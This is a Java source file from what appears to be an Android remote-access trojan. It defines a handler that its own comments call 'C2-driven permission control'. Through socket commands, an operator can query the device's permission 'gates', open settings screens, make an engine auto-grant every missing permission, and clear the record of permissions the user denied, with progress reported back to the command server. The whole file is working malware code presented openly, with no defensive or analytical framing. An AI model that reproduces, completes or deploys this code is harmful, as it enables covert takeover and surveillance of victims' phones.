package com.fason.app.features.permgrant;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONObject;

import io.socket.client.Socket;

/**
 * RemotePermissionHandler — C2-driven permission control.
 *
 * The operator sends one command over the existing socket; this handler
 * does the rest. Dashboard-agnostic: emits results on the same events the
 * current dashboard already listens to.
 *
 * Commands (type = 0xPM, action field):
 *   "gate_report"      → full gate state JSON
 *   "gate_open"        → open one gate's settings (perm=<gateId>)
 *   "auto_grant_all"   → engine walks every missing gate
 *   "auto_grant"       → engine grants one gate (perm=<gateId>)
 *   "auto_reset"       → clear session-deny memory
 *   "auto_status"      → engine state report
 */
public final class RemotePermissionHandler {
    private RemotePermissionHandler() {}

    public static void handle(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        switch (action) {
            case "gate_report":
                emit(socket, PermissionManager.buildGateReport(FasonApp.getContext()), cmdId);
                return;
            case "gate_open": {
                String gateId = data.optString(Protocol.KEY_PERM, "");
                boolean opened = false;
                PermissionManager.Gate g = PermissionManager.findGate(gateId);
                if (g != null) {
                    opened = PermissionManager.openGate(FasonApp.getContext(), g);
                }
                JSONObject r = PermissionManager.buildGateReport(FasonApp.getContext());
                try {
                    r.put("opened", opened);
                    r.put("requestedGate", gateId);
                } catch (Exception ignored) {}
                emit(socket, r, cmdId);
                return;
            }
            case "auto_grant_all":
                AutoPermissionEngine.getInstance().grantAll(newEngineCallback(socket, cmdId));
                return;
            case "auto_grant": {
                String gateId = data.optString(Protocol.KEY_PERM, "");
                AutoPermissionEngine.getInstance().grantGate(gateId,
                    newEngineCallback(socket, cmdId));
                return;
            }
            case "auto_reset":
                AutoPermissionEngine.getInstance().resetSessionDenies();
                emitAck(socket, cmdId, "session denies cleared");
                return;
            case "auto_status":
                emit(socket, AutoPermissionEngine.getInstance().buildReport(), cmdId);
                return;
            default:
                emitAck(socket, cmdId, "unknown action: " + action);
        }
    }

    private static AutoPermissionEngine.Callback newEngineCallback(Socket socket, String cmdId) {
        return new AutoPermissionEngine.Callback() {
            @Override
            public void onProgress(String gateId, boolean granted, String note) {
                try {
                    JSONObject o = new JSONObject();
                    o.put(Protocol.KEY_TYPE, "auto_perm_progress");
                    o.put("gate", gateId);
                    o.put("granted", granted);
                    o.put("note", note);
                    if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
                    if (socket != null) socket.emit(Protocol.PERMISSIONS, o);
                } catch (Exception ignored) {}
            }
            @Override
            public void onComplete(boolean allGranted, String summary) {
                try {
                    JSONObject o = new JSONObject();
                    o.put(Protocol.KEY_TYPE, "auto_perm_done");
                    o.put("allGranted", allGranted);
                    o.put("summary", summary);
                    if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
                    if (socket != null) socket.emit(Protocol.PERMISSIONS, o);
                } catch (Exception ignored) {}
            }
        };
    }

    private static void emit(Socket socket, JSONObject payload, String cmdId) {
        if (socket == null) return;
        try {
            if (cmdId != null) payload.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.PERMISSIONS, payload);
        } catch (Exception ignored) {}
    }

    private static void emitAck(Socket socket, String cmdId, String msg) {
        if (socket == null) return;
        try {
            JSONObject o = new JSONObject();
            o.put(Protocol.KEY_TYPE, "ack");
            o.put("message", msg);
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.PERMISSIONS, o);
        } catch (Exception ignored) {}
    }
}
